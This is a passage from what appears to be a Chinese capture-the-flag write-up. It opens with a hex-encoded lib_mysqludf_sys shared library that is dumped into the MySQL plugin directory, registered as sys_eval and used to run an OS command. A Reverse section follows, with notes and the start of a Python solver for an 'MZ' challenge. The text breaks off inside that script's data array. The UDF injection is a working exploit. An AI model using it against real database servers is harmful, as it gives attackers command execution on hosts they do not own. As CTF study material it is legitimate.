83dffffffe848ffffffc60529142000015dc30f1f8000000000f3c3660f1f440000554889e55de966ffffff554889e548897de8488975e0488955d8488b45e08b0085c07463488b45d848ba4e6f20617267756d48b9656e747320616c6c4889104889480848be6f7765642028756448bf663a206c69625f6d488970104889781848ba7973716c7564665f48b97379735f696e666f488950204889482866c740302900c645ff01eb04c645ff000fb645ff5dc3554889e548897df8905dc3554889e548897df8488975f0488955e848894de04c8945d84c894dd0488b45e848ba6c69625f6d79737148b96c7564665f7379734889104889480848be2076657273696f6e48897010c7401820302e3066c7401c2e33c6401e00488b45e048c7001e000000488b45e85dc3554889e548897df8488975f0488955e8488b45f08b0083f801751c488b45f0488b40088b0085c0750e488b45f8c60001b800000000eb58488b45e848ba457870656374656448b92065786163746c794889104889480848be206f6e652073747248bf696e672074797065488970104889781848b920706172616d65744889482066c740286572c6402a00b8010000005dc3554889e548897df8905dc3554889e54883ec4048897de8488975e0488955d848894dd04c8945c84c894dc0488b45e0488b4010488b004889c7e87afcffff488945f848837df8007509488b45c8c60001eb16488b45f84889c7e89afcffff4889c2488b45d0488910488b45f8c9c3554889e54883ec2048897df8488975f0488955e8488b45f08b0083f8027448488b45e848be457870656374656448bf2065786163746c794889304889780848b92074776f2061726748894810c74018756d656e66c7401c7473c6401e00b801000000e9f3000000488b45f0488b40088b0085c07453488b45e848be457870656374656448bf20737472696e67204889304889780848ba7479706520666f7248b9206e616d65207061488950104889481848b972616d657465720048894820b801000000e992000000488b45f0488b40084883c004c70000000000488b45f0488b4018488b10488b45f0488b40184883c008488b004801d04883c0024889c7e8e7fbffff4889c2488b45f848895010488b45f8488b40104885c0753a488b45e848be436f756c64206e6f48bf7420616c6c6f63614889304889780848b97465206d656d6f724889481066c740187900b801000000eb05b800000000c9c3554889e54883ec1048897df8488b45f8488b40104885c07410488b45f8488b40104889c7e8d5faffff90c9c3554889e54883ec3048897de8488975e0488955d848894dd0488b45e8488b4010488945f0488b45e0488b4018488b00488d5001488b45f04801d0488945f8488b45e0488b4018488b10488b45e0488b4010488b08488b45f04889ce4889c7e8effaffff488b45e0488b4018488b10488b45f04801d0c60000488b45e0488b40184883c008488b10488b45e0488b40104883c008488b08488b45f84889ce4889c7e8adfaffff488b45e0488b40184883c008488b10488b45f84801d0c60000488b4df8488b45f0ba010000004889ce4889c7e81cfaffff4898c9c3554889e548897de8488975e0488955d8c745fc00000000488b45e08b0083f801751f488b45e0488b40088b55fc48c1e2024801d08b0085c07507b800000000eb58488b45d848be457870656374656448bf2065786163746c794889304889780848be206f6e652073747248bf696e672074797065488970104889781848b920706172616d65744889482066c740286572c6402a00b8010000005dc3554889e548897df8905dc3554889e54883ec2048897df8488975f0488955e848894de0488b45f0488b4010488b004889c7e877f9ffff4898c9c3554889e548897de8488975e0488955d8c745fc00000000488b45e08b0083f801751f488b45e0488b40088b55fc48c1e2024801d08b0085c07507b800000000eb58488b45d848be457870656374656448bf2065786163746c794889304889780848be206f6e652073747248bf696e672074797065488970104889781848b920706172616d65744889482066c740286572c6402a00b8010000005dc3554889e548897df8905dc3554889e54881ec600400004889bdc8fbffff4889b5c0fbffff488995b8fbffff48898db0fbffff4c8985a8fbffff4c898da0fbffff64488b042528000000488945f831c0bf01000000e8bff8ffff488985b8fbffff48c785d8fbffff00000000488b85c0fbffff488b4010488b00488d35390100004889c7e8b0f8ffff488985e0fbffffeb79488d85f0fbffff4889c7e818f8ffff488985e8fbffff488b95d8fbffff488b85e8fbffff4801c2488b85b8fbffff4889d64889c7e85ef8ffff488985b8fbffff488b95b8fbffff488b85d8fbffff488d0c02488b95e8fbffff488d85f0fbffff4889c64889cfe89cf7ffff488b85e8fbffff480185d8fbffff488b95e0fbffff488d85f0fbffffbe000400004889c7e8d3f7ffff4885c00f8563ffffff488b85e0fbffff4889c7e8abf7ffff488b85b8fbffff0fb60084c0740a4883bdb8fbffff00750c488b85a8fbffffc60001eb30488b95b8fbffff488b85d8fbffff4801d0c60000488b85b8fbffff4889c7e834f7ffff4889c2488b85b0fbffff488910488b85b8fbffff488b4df86448330c25280000007405e81cf7ffffc9c300004883ec084883c408c3720000011b033b9000000011000000acf6ffffac0000008cf7ffffd400000076f8ffffec000000fdf8ffff0c01000008f9ffff2c01000073f9ffff4c01000004faffff6c0100000ffaffff8c01000072faffffac010000cefbffffcc010000fafbffffec010000d4fcffff0c0200006ffdffff2c0200007afdffff4c020000a9fdffff6c02000044feffff8c0200004ffeffffac0200001400000000000000017a5200017810011b0c070890010000240000001c000000f8f5ffffe0000000000e10460e184a0f0b770880003f1a3b2a332422000000001400000044000000b0f6ffff0800000000000000000000001c0000005c00000082f7ffff8700000000410e108602430d0602820c070800001c0000007c000000e9f7ffff0b00000000410e108602430d06460c07080000001c0000009c000000d4f7ffff6b00000000410e108602430d0602660c070800001c000000bc0000001ff8ffff9100000000410e108602430d06028c0c070800001c000000dc00000090f8ffff0b00000000410e108602430d06460c07080000001c000000fc0000007bf8ffff6300000000410e108602430d06025e0c070800001c0000001c010000bef8ffff5c01000000410e108602430d060357010c0708001c0000003c010000faf9ffff2c00000000410e108602430d06670c07080000001c0000005c01000006faffffda00000000410e108602430d0602d50c070800001c0000007c010000c0faffff9b00000000410e108602430d0602960c070800001c0000009c0100003bfbffff0b00000000410e108602430d06460c07080000001c000000bc01000026fbffff2f00000000410e108602430d066a0c07080000001c000000dc01000035fbffff9b00000000410e108602430d0602960c070800001c000000fc010000b0fbffff0b00000000410e108602430d06460c07080000001c0000001c0200009bfbffffa301000000410e108602430d06039e010c0708000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000700c000000000000300c0000000000000100000000000000a2010000000000000c00000000000000900a0000000000000d00000000000000f8130000000000001900000000000000101e2000000000001b0000000000000008000000000000001a00000000000000181e2000000000001c000000000000000800000000000000f5feff6f00000000f001000000000000050000000000000038060000000000000600000000000000a8020000000000000a00000000000000e5010000000000000b000000000000001800000000000000030000000000000000202000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000058090000000000000700000000000000b0080000000000000800000000000000a80000000000000009000000000000001800000000000000feffff6f000000007008000000000000ffffff6f000000000100000000000000f0ffff6f000000001e08000000000000f9ffff6f00000000030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000201e20000000000000000000000000000000000000000000c60a000000000000d60a000000000000e60a000000000000f60a000000000000060b000000000000160b000000000000260b000000000000360b000000000000460b000000000000560b000000000000660b000000000000760b000000000000860b00000000000080202000000000004743433a20285562756e747520372e342e302d317562756e7475317e31382e30342e312920372e342e300000000000000000000000000000000000000000000000000000000000000000000003000100c80100000000000000000000000000000000000003000200f00100000000000000000000000000000000000003000300a802000000000000000000000000000000000000030004003806000000000000000000000000000000000000030005001e0800000000000000000000000000000000000003000600700800000000000000000000000000000000000003000700b00800000000000000000000000000000000000003000800580900000000000000000000000000000000000003000900900a00000000000000000000000000000000000003000a00b00a00000000000000000000000000000000000003000b00900b00000000000000000000000000000000000003000c00a00b00000000000000000000000000000000000003000d00f81300000000000000000000000000000000000003000e00011400000000000000000000000000000000000003000f00041400000000000000000000000000000000000003001000981400000000000000000000000000000000000003001100101e20000000000000000000000000000000000003001200181e20000000000000000000000000000000000003001300201e20000000000000000000000000000000000003001400e01f2000000000000000000000000000000000000300150000202000000000000000000000000000000000000300160080202000000000000000000000000000000000000300170088202000000000000000000000000000000000000300180000000000000000000000000000000000010000000400f1ff000000000000000000000000000000000c00000002000c00a00b00000000000000000000000000000e00000002000c00e00b00000000000000000000000000002100000002000c00300c00000000000000000000000000003700000001001700882020000000000001000000000000004600000001001200181e20000000000000000000000000006d00000002000c00700c00000000000000000000000000007900000001001100101e2000000000000000000000000000980000000400f1ff00000000000000000000000000000000010000000400f1ff00000000000000000000000000000000ab00000001001000d0160000000000000000000000000000000000000400f1ff00000000000000000000000000000000b90000000100160080202000000000000000000000000000c600000001001300201e2000000000000000000000000000cf00000000000f0004140000000000000000000000000000e20000000100160088202000000000000000000000000000ee00000001001500002020000000000000000000000000000401000012000000000000000000000000000000000000001801000012000000000000000000000000000000000000002a01000012000000000000000000000000000000000000003f01000020000000000000000000000000000000000000005b01000012000c00080e0000000000000b000000000000006a01000012000c007e110000000000002f000000000000007301000012000c00d8100000000000009b000000000000008101000012000000000000000000000000000000000000009501000010001600882020000000000000000000000000009c01000012000d00f8130000000000000000000000000000a20100001200000000000000000000000000000000000000b60100001200000000000000000000000000000000000000d20100001200000000000000000000000000000000000000e60100001200000000000000000000000000000000000000fa01000012000000000000000000000000000000000000000d02000012000c005312000000000000a3010000000000001602000012000c00130e00000000000063000000000000001e02000020000000000000000000000000000000000000002d02000012000c00fe0f000000000000da000000000000003502000012000000000000000000000000000000000000004802000012000c000c0d0000000000006b000000000000005e02000012000000000000000000000000000000000000007202000012000c00010d0000000000000b000000000000008f02000012000c00760e0000000000005c010000000000009c0200001000170090202000000000000000000000000000a102000012000c0048120000000000000b00000000000000b10200001200000000000000000000000000000000000000c60200001000170088202000000000000000000000000000d20200001200000000000000000000000000000000000000e502000012000c00d20f0000000000002c00000000000000f402000012000c0073110000000000000b000000000000000403000012000c00ad110000000000009b000000000000001203000012000c00770d00000000000091000000000000001f03000020000000000000000000000000000000000000003903000022000000000000000000000000000000000000007b01000012000900900a00000000000000000000000000005503000012000c007a0c00000000000087000000000000000063727473747566662e6300646572656769737465725f746d5f636c6f6e6573005f5f646f5f676c6f62616c5f64746f72735f61757800636f6d706c657465642e37363937005f5f646f5f676c6f62616c5f64746f72735f6175785f66696e695f61727261795f656e747279006672616d655f64756d6d79005f5f6672616d655f64756d6d795f696e69745f61727261795f656e747279006c69625f6d7973716c7564665f7379732e63005f5f4652414d455f454e445f5f005f5f64736f5f68616e646c65005f44594e414d4943005f5f474e555f45485f4652414d455f484452005f5f544d435f454e445f5f005f474c4f42414c5f4f46465345545f5441424c455f00676574656e764040474c4942435f322e322e3500667265654040474c4942435f322e322e35007374726e6370794040474c4942435f322e322e35005f49544d5f64657265676973746572544d436c6f6e655461626c65007379735f6765745f6465696e6974007379735f65786563007379735f657865635f696e697400736574656e764040474c4942435f322e322e35005f6564617461005f66696e69007374726c656e4040474c4942435f322e322e35005f5f737461636b5f63686b5f6661696c4040474c4942435f322e340073797374656d4040474c4942435f322e322e350070636c6f73654040474c4942435f322e322e350066676574734040474c4942435f322e322e35007379735f6576616c007379735f676574005f5f676d6f6e5f73746172745f5f007379735f736574006d656d6370794040474c4942435f322e3134006c69625f6d7973716c7564665f7379735f696e666f006d616c6c6f634040474c4942435f322e322e35006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f7365745f696e6974005f656e64007379735f6576616c5f6465696e6974007265616c6c6f634040474c4942435f322e322e35005f5f6273735f737461727400706f70656e4040474c4942435f322e322e35007379735f7365745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f696e6974007379735f6765745f696e6974005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a654040474c4942435f322e322e35006c69625f6d7973716c7564665f7379735f696e666f5f696e697400002e73796d746162002e737472746162002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e706c742e676f74002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e64796e616d6963002e676f742e706c74002e64617461002e627373002e636f6d6d656e740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b000000070000000200000000000000c801000000000000c80100000000000024000000000000000000000000000000040000000000000000000000000000002e000000f6ffff6f0200000000000000f001000000000000f001000000000000b400000000000000030000000000000008000000000000000000000000000000380000000b0000000200000000000000a802000000000000a80200000000000090030000000000000400000001000000080000000000000018000000000000004000000003000000020000000000000038060000000000003806000000000000e50100000000000000000000000000000100000000000000000000000000000048000000ffffff6f02000000000000001e080000000000001e080000000000004c0000000000000003000000000000000200000000000000020000000000000055000000feffff6f020000000000000070080000000000007008000000000000400000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000b008000000000000b008000000000000a8000000000000000300000000000000080000000000000018000000000000006e00000004000000420000000000000058090000000000005809000000000000380100000000000003000000150000000800000000000000180000000000000078000000010000000600000000000000900a000000000000900a000000000000170000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000b00a000000000000b00a000000000000e0000000000000000000000000000000100000000000000010000000000000007e000000010000000600000000000000900b000000000000900b000000000000080000000000000000000000000000000800000000000000080000000000000087000000010000000600000000000000a00b000000000000a00b00000000000056080000000000000000000000000000100000000000000000000000000000008d000000010000000600000000000000f813000000000000f8130000000000000900000000000000000000000000000004000000000000000000000000000000930000000100000002000000000000000114000000000000011400000000000002000000000000000000000000000000010000000000000000000000000000009b000000010000000200000000000000041400000000000004140000000000009400000000000000000000000000000004000000000000000000000000000000a9000000010000000200000000000000981400000000000098140000000000003c02000000000000000000000000000008000000000000000000000000000000b30000000e0000000300000000000000101e200000000000101e0000000000000800000000000000000000000000000008000000000000000800000000000000bf0000000f0000000300000000000000181e200000000000181e0000000000000800000000000000000000000000000008000000000000000800000000000000cb000000060000000300000000000000201e200000000000201e000000000000c00100000000000004000000000000000800000000000000100000000000000082000000010000000300000000000000e01f200000000000e01f0000000000002000000000000000000000000000000008000000000000000800000000000000d4000000010000000300000000000000002020000000000000200000000000008000000000000000000000000000000008000000000000000800000000000000dd000000010000000300000000000000802020000000000080200000000000000800000000000000000000000000000008000000000000000000000000000000e3000000080000000300000000000000882020000000000088200000000000000800000000000000000000000000000001000000000000000000000000000000e8000000010000003000000000000000000000000000000088200000000000002b00000000000000000000000000000001000000000000000100000000000000010000000200000000000000000000000000000000000000b82000000000000068070000000000001a0000002a0000000800000000000000180000000000000009000000030000000000000000000000000000000000000020280000000000007003000000000000000000000000000001000000000000000000000000000000110000000300000000000000000000000000000000000000902b000000000000f100000000000000000000000000000001000000000000000000000000000000&#x27;) into dumpfile &#x27;/usr/lib/mysql/p1ugin/mysqludf111.so&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">create function sys_eval returns string soname &quot;mysqludf111.so&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">select sys_eval(&#x27;env&#x27;);</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1706599727475-61133a3e-8467-4253-96f2-fc859fc53986.png\" alt=\"\"></p>\n<h3 id=\"reverse\"><a class=\"markdownIt-Anchor\" href=\"#reverse\">#</a> Reverse</h3>\n<h4 id=\"mz\"><a class=\"markdownIt-Anchor\" href=\"#mz\">#</a> MZ</h4>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1706626189405-35f77f62-dfad-4f0f-b2d8-c3e8747f55ec.png\" alt=\"\"></p>\n<p>所以每一个输入的字母都必须满足两个判断中的一个，否则就会输出 Wrong flag</p>\n<p>直接爆破发现有多解，不能直接爆破，需要使用 DFS 深度优先算法去遍历所有的解法。由题目提示知道 flag 是有意义的字符串，发现比较像 flag 的字符串，输入发现正确。就不用通过 v9 去进行 sha1 判断了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from asyncio import sleep</span><br><span class=\"line\">import hashlib</span><br><span class=\"line\">import string</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">data = [0x00000005, 0x00F0F7D8, 0x00000002, 0x00F0E2E0, 0x00000014, 0x00F11E10, 0x00000015, 0x00F0E9D8, 0x0000002B, 0x00F10CB0, 0x00000076, 0x00F0CD70, 0x0000005F, 0x00F0CE58, 0x0000000C, 0x00F0EAC8, 0x0000005D, 0x00F0A438, 0x00000067, 0x00F0A950, 0x0000000D, 0x00F10CF0, 0x00000045, 0x00F0D288, 0x0000006C, 0x00F10030, 0x0000004A, 0x00F0E7C0, 0x00000045, 0x00F090E0, 0x00000020, 0x00F0C858, 0x00000050, 0x00F0BB88, 0x00000071, 0x00F0C410, 0x00000045, 0x00F0E4C0, 0x00000044, 0x00F0F0E0, 0x0000006A, 0x00F10A08, 0x00000050, 0x00F0D778, 0x0000001F, 0x00F0CF18, 0x00000036, 0x00F0CD68, 0x00000009, 0x00F0BEA8, 0x00000056, 0x00F0E380, 0x00000028, 0x00F0CA70, 0x0000000A, 0x00F0AA10, 0x00000035, 0x00F0DAA8, 0x0000007D, 0x00F11930, 0x0000007D, 0x00F0BA98, 0x0000002B, 0x00F0B3D8, 0x00000001, 0x00F0C648, 0x00000059, 0x00F09D90, 0x00000031, 0x00F0CB20, 0x00000058, 0x00F09F70, 0x00000002, 0x00F10780, 0x00000062, 0x00F0B2E0, 0x00000015, 0x00F0F318, 0x00000032, 0x00F0F798, 0x00000067, 0x00F10648, 0x00000058, 0x00F093A8, 0x0000001A, 0x00F0FEC8, 0x00000062, 0x00F10D30, 0x0000003E, 0x00F0FF68, 0x0000003C, 0x00F11068, 0x00000063, 0x00F0AC38, 0x00000078, 0x00F0A988, 0x00000037, 0x00F0C898, 0x00000076, 0x00F0ACE8, 0x00000069, 0x00F0C5C0, 0x0000005B, 0x00F0C238, 0x00000038, 0x00F09818, 0x00000017, 0x00F0A530, 0x0000004A, 0x00F12068, 0x0000004D, 0x00F0AD50, 0x0000005A, 0x00F10E98, 0x00000039, 0x00F0C180, 0x00000027, 0x00F0F278, 0x0000002B, 0x00F0C7F0, 0x0000003C, 0x00F10FA8, 0x0000007B, 0x00F0BF20, 0x00000034, 0x00F0BDC8, 0x00000030, 0x00F0F020, 0x00000048, 0x00F12BB8, 0x00000029, 0x00F098D8, 0x00000065, 0x00F0BA50, 0x0000007A, 0x00F10D80, 0x00000037, 0x00F10B08, 0x0000007A, 0x00F0A2E0, 0x00000032, 0x00F0A2C0, 0x00000005, 0x00F0AC98, 0x00000027, 0x00F0A918, 0x00000070, 0x00F0DA90, 0x00000079, 0x00F09D00, 0x00000064, 0x00F0BC88, 0x00000052, 0x00F0A4E8, 0x0000005D, 0x00F0FEA0, 0x00000018, 0x00F0BDB8, 0x0000001F, 0x00F10C60, 0x0000006C, 0x00F118A8, 0x0000007D, 0x00F0CE18, 0x00000005, 0x00F0B220, 0x00000058, 0x00F093A8, 0x00000015, 0x00F0CFA0, 0x0000003F, 0x00F09538, 0x00000023, 0x00F103D8, 0x00000075, 0x00F0CFE8, 0x0000007A, 0x00F0B688, 0x0000001F, 0x00F09798, 0x00000024, 0x00F0EAA0, 0x0000003F, 0x00F0E9C0, 0x00000008, 0x00F0ADA8, 0x0000002B, 0x00F11EA0, 0x00000017, 0x00F0D310, 0x00000038, 0x00F0A310, 0x00000045, 0x00F0C7A8, 0x00000025, 0x00F09730, 0x0000000C, 0x00F0FE28, 0x00000014, 0x00F0E180, 0x0000004D, 0x00F0AD98, 0x00000042, 0x00F0B0B8, 0x0000005E, 0x00F0B180, 0x0000006E, 0x00F111C8, 0x0000006B, 0x00F0C6A8, 0x00000007, 0x00F098C8, 0x00000024, 0x00F0BFD8, 0x0000000D, 0x00F0D218, 0x0000004C, 0x00F0E8E8, 0x00000054, 0x00F0A968, 0x0000002A, 0x00F0E110, 0x0000001C, 0x00F0B170, 0x0000005D, 0x00F09E38, 0x0000007B, 0x00F0F758, 0x0000002C, 0x00F12028, 0x00000034, 0x00F0FE38, 0x00000046, 0x00F0B7F0, 0x00000007, 0x00F10DD8, 0x00000010, 0x00F10470, 0x0000005E, 0x00F10130, 0x00000079, 0x00F0A740, 0x0000001B, 0x00F0C638, 0x00000058, 0x00F11DB0, 0x00000047, 0x00F0C508, 0x0000007A, 0x00F12168, 0x00000070, 0x00F0ACF0, 0x0000002D, 0x00F0DDC0, 0x0000000F, 0x00F0C5B8, 0x00000029, 0x00F0B458, 0x00000003, 0x00F0DCD8, 0x0000007A, 0x00F0E198, 0x00000041, 0x00F0A770, 0x00000047, 0x00F092A8, 0x0000003D, 0x00F0F958, 0x00000046, 0x00F0D5A8, 0x0000005F, 0x00F11E70, 0x00000009, 0x00F09900, 0x0000006E, 0x00F0C798, 0x00000011, 0x00F0A6D8, 0x00000014, 0x00F0DB98, 0x0000004F, 0x00F11A28, 0x00000043, 0x00F10440, 0x00000063, 0x00F0B050, 0x0000007E, 0x00F12A70, 0x00000000, 0x00F0A250, 0x00000062, 0x00F09828, 0x00000077, 0x00F12248, 0x00000031, 0x00F0BCE0, 0x00000009, 0x00F0BC00, 0x00000036, 0x00F0CBC8, 0x00000078, 0x00F0E5A8, 0x00000033, 0x00F0F2B0, 0x00000067, 0x00F0D4F0, 0x00000043, 0x00F0D5B0, 0x0000007C, 0x00F0C7A0, 0x0000003D, 0x00F0F840, 0x00000071, 0x00F0D428, 0x00000033, 0x00F117D0, 0x0000007D, 0x00F11090, 0x00000000, 0x00F0DC98, 0x00000024, 0x00F12050, 0x00000073, 0x00F0D5D0, 0x0000000A, 0x00F12430, 0x00000022, 0x00F11690, 0x00000023, 0x00F0A700, 0x0000006F, 0x00F09D50, 0x0000000E, 0x00F0DFF0, 0x00000043, 0x00F0E7C0, 0x0000004C, 0x00F0BDD8, 0x0000007C, 0x00F11DF8, 0x0000003A, 0x00F12A38, 0x00000036, 0x00F0D7C8, 0x00000075, 0x00F0C368, 0x00000051, 0x00F102B0, 0x0000000F, 0x00F0D2B0, 0x00000051, 0x00F0AC60, 0x00000041, 0x00F0B3A8, 0x0000002A, 0x00F0FE88, 0x00000002, 0x00F09290, 0x0000005C, 0x00F0B9C0, 0x0000001D, 0x00F12C58, 0x0000000E, 0x00F11748, 0x00000049, 0x00F0FD80, 0x00000020, 0x00F0C6E0, 0x00000055, 0x00F0F7E8, 0x0000002C, 0x00F12670, 0x0000004A, 0x00F0DEB0, 0x0000001D, 0x00F0F328, 0x00000051, 0x00F0ECF0, 0x00000055, 0x00F11A48, 0x00000013, 0x00F0B280, 0x00000058, 0x00F0A820, 0x00000068, 0x00F0C588, 0x0000002E, 0x00F0C658, 0x00000013, 0x00F10030, 0x00000050, 0x00F0F6E8, 0x00000061, 0x00F0AC10, 0x00000060, 0x00F102E0, 0x00000060, 0x00F09758, 0x00000005, 0x00F0F408, 0x00000009, 0x00F10B70, 0x00000005, 0x00F116E8, 0x00000017, 0x00F096B8, 0x00000034, 0x00F0F0A8, 0x00000063, 0x00F0B1B0, 0x00000020, 0x00F0C6E8, 0x00000070, 0x00F0E230, 0x00000024, 0x00F10EC8, 0x00000012, 0x00F12880, 0x00000046, 0x00F0FDC0, 0x00000060, 0x00F0AEC0, 0x00000014, 0x00F0BCD0, 0x00000044, 0x00F0F5B0, 0x00000074, 0x00F096F0, 0x00000068, 0x00F0FEB8, 0x00000052, 0x00F0CB80, 0x00000052, 0x00F0BEA8, 0x00000069, 0x00F0FB10, 0x00000076, 0x00F0AFA0, 0x00000065, 0x00F0A748, 0x00000075, 0x00F0C7B0, 0x0000003C, 0x00F12990, 0x00000074, 0x00F0B410, 0x00000065, 0x00F0F620, 0x00000024, 0x00F0A3C8, 0x00000066, 0x00F0B6B8, 0x00000070, 0x00F0EF48, 0x00000069, 0x00F0FFB0, 0x00000004, 0x00F11A28, 0x00000012, 0x00F0F3F8, 0x00000064, 0x00F0BF60, 0x00000011, 0x00F10208, 0x0000000B, 0x00F0E708, 0x0000005C, 0x00F0F4E8, 0x00000020, 0x00F0B760, 0x00000046, 0x00F0DF40, 0x00000038, 0x00F0FB38, 0x00000056, 0x00F0C2B8, 0x00000052, 0x00F0FA98, 0x00000000, 0x00F122E0, 0x00000063, 0x00F0F358, 0x00000029, 0x00F11288, 0x00000030, 0x00F0B488, 0x00000034, 0x00F0A890, 0x00000040, 0x00F09D88, 0x00000054, 0x00F12C00, 0x0000003D, 0x00F0A318, 0x00000074, 0x00F0DD58, 0x00000070, 0x00F0C360, 0x00000010, 0x00F0B3F8, 0x0000003C, 0x00F09478, 0x00000011, 0x00F11350, 0x00000044, 0x00F098B8, 0x0000004B, 0x00F0F368, 0x0000002A, 0x00F0D708, 0x00000073, 0x00F09450, 0x00000008, 0x00F10400, 0x00000051, 0x00F0A568, 0x00000077, 0x00F0D8C8, 0x00000009, 0x00F0DAE8, 0x00000009, 0x00F0D0C0, 0x0000000C, 0x00F09E68, 0x00000044, 0x00F0C890, 0x00000055, 0x00F0FBB0, 0x00000028, 0x00F108E8, 0x00000059, 0x00F125C0, 0x00000051, 0x00F0CBA8, 0x0000002B, 0x00F11340, 0x00000017, 0x00F0FF80, 0x00000018, 0x00F0C1E0, 0x00000000, 0x00F0A520, 0x00000071, 0x00F0A5A8, 0x00000027, 0x00F11778, 0x00000049, 0x00F12720, 0x00000007, 0x00F0A938, 0x0000001A, 0x00F0D080, 0x0000004F, 0x00F0F620, 0x00000049, 0x00F0FA38, 0x00000032, 0x00F12C58, 0x00000036, 0x00F0F398, 0x00000040, 0x00F0B4A0, 0x00000033, 0x00F0BB78, 0x00000051, 0x00F0BBF0, 0x0000001E, 0x00F099D0, 0x0000001A, 0x00F0AEC8, 0x00000069, 0x00F09698, 0x0000003F, 0x00F0D360, 0x0000004E, 0x00F0ECB0, 0x00000044, 0x00F11140, 0x00000025, 0x00F09AA8, 0x00000004, 0x00F114E8, 0x0000004C, 0x00F0B458, 0x00000071, 0x00F09E98, 0x0000004D, 0x00F0A0E8, 0x00000027, 0x00F0DA20, 0x0000003E, 0x00F0F650, 0x0000002F, 0x00F09088, 0x0000004C, 0x00F0B360, 0x0000001D, 0x00F0B910, 0x0000001E, 0x00F0A978, 0x00000070, 0x00F0D4C8, 0x0000000B, 0x00F0F050, 0x00000064, 0x00F099C8, 0x00000006, 0x00F0C8A0, 0x0000004B, 0x00F112D8, 0x0000001D, 0x00F09088, 0x0000007B, 0x00F0F248, 0x00000022, 0x00F0D168, 0x00000034, 0x00F0B038, 0x0000007A, 0x00F12B00, 0x00000067, 0x00F0C538, 0x00000042, 0x00F09490, 0x00000051, 0x00F0A120, 0x0000006A, 0x00F0E688, 0x00000072, 0x00F12988, 0x00000009, 0x00F0E680, 0x00000068, 0x00F099D0, 0x00000076, 0x00F0F950, 0x00000037, 0x00F117D8, 0x00000043, 0x00F112C0, 0x0000000C, 0x00F11480, 0x00000013, 0x00F0CA00, 0x00000063, 0x00F0FF68, 0x0000004F, 0x00F0C178, 0x00000042, 0x00F12738, 0x0000005F, 0x00F12938, 0x00000038, 0x00F0AA50, 0x00000037, 0x00F0DBE0, 0x0000006E, 0x00F128E8, 0x0000000C, 0x00F0ED98, 